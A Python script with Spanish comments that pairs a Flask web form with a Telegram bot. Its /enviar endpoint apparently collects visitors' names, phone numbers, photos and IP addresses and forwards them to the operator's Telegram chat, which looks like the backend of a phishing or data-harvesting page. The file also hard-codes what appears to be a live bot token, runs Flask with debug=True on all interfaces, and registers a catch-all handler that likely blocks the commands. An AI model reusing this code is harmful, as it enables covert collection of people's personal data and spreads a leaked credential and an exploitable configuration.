import os
import threading
from flask import Flask, render_template, request, jsonify
import telebot
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURACIÓN (NO SE TOCA) ---
TOKEN = "8761804922:AAFz2AebtHNgYQgbNVZfAz179jUzydrSbXk"
MI_ID = "8114050673"

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ==============================
# 🔐 CONTROL
# ==============================

bot_activo = True
usuarios_autorizados = {int(MI_ID)}

def autorizado(user_id):
    return user_id in usuarios_autorizados

# ==============================
# 🔥 DEBUG (IMPORTANTE)
# ==============================

@bot.message_handler(func=lambda m: True)
def debug_all(msg):
    print("📩 MENSAJE RECIBIDO:", msg.text)

# ==============================
# 🔥 COMANDOS
# ==============================

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "👑 BOT ACTIVO\nUsa /help")

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    bot.reply_to(msg,
        "/start\n/help\n/info\n/id\n/on\n/off\n/adduser ID\n/deluser ID\n/users\n/location"
    )

@bot.message_handler(commands=['id'])
def get_id(msg):
    bot.reply_to(msg, f"🆔 {msg.chat.id}")

@bot.message_handler(commands=['info'])
def info(msg):
    estado = "🟢 Activo" if bot_activo else "🔴 Apagado"
    bot.reply_to(msg, f"Estado: {estado}")

# ==============================
# 🔘 ON / OFF
# ==============================

@bot.message_handler(commands=['on'])
def encender(msg):
    global bot_activo
    if not autorizado(msg.chat.id):
        return
    bot_activo = True
    bot.reply_to(msg, "🟢 ACTIVADO")

@bot.message_handler(commands=['off'])
def apagar(msg):
    global bot_activo
    if not autorizado(msg.chat.id):
        return
    bot_activo = False
    bot.reply_to(msg, "🔴 APAGADO")

# ==============================
# 👥 USUARIOS
# ==============================

@bot.message_handler(commands=['adduser'])
def add_user(msg):
    if not autorizado(msg.chat.id):
        return
    try:
        user_id = int(msg.text.split()[1])
        usuarios_autorizados.add(user_id)
        bot.reply_to(msg, f"✅ {user_id} agregado")
    except:
        bot.reply_to(msg, "❌ Uso: /adduser ID")

@bot.message_handler(commands=['deluser'])
def del_user(msg):
    if not autorizado(msg.chat.id):
        return
    try:
        user_id = int(msg.text.split()[1])
        usuarios_autorizados.discard(user_id)
        bot.reply_to(msg, f"🗑 {user_id} eliminado")
    except:
        bot.reply_to(msg, "❌ Uso: /deluser ID")

@bot.message_handler(commands=['users'])
def ver_users(msg):
    if not autorizado(msg.chat.id):
        return
    lista = "\n".join([str(u) for u in usuarios_autorizados])
    bot.reply_to(msg, f"👥\n{lista}")

# ==============================
# 📍 UBICACIÓN
# ==============================

@bot.message_handler(commands=['location'])
def pedir_ubicacion(msg):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = telebot.types.KeyboardButton("📍 Compartir ubicación", request_location=True)
    markup.add(btn)

    bot.send_message(msg.chat.id, "Comparte tu ubicación", reply_markup=markup)

@bot.message_handler(content_types=['location'])
def recibir_ubicacion(msg):
    lat = msg.location.latitude
    lon = msg.location.longitude

    bot.send_message(msg.chat.id,
        f"https://maps.google.com/?q={lat},{lon}"
    )

# ==============================
# 🌐 WEB
# ==============================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    global bot_activo

    if not bot_activo:
        return jsonify({"status": "off"}), 403

    try:
        nombre = request.form.get('nombre')
        telefono = request.form.get('telefono')
        foto = request.files['foto']

        fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        reporte = (
            f"📸\n"
            f"{nombre}\n"
            f"{telefono}\n"
            f"{request.remote_addr}\n"
            f"{fecha}"
        )

        bot.send_photo(MI_ID, foto, caption=reporte)

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

# ==============================
# 🤖 INICIO (ARREGLADO)
# ==============================

def iniciar_bot():
    print("🤖 Bot corriendo...")
    try:
        bot.infinity_polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print("❌ ERROR BOT:", e)

if __name__ == '__main__':
    print("🔥 Iniciando sistema...")

    hilo = threading.Thread(target=iniciar_bot)
    hilo.daemon = True
    hilo.start()

    print("🌐 Flask corriendo...")
    app.run(host='0.0.0.0', port=5000, debug=True)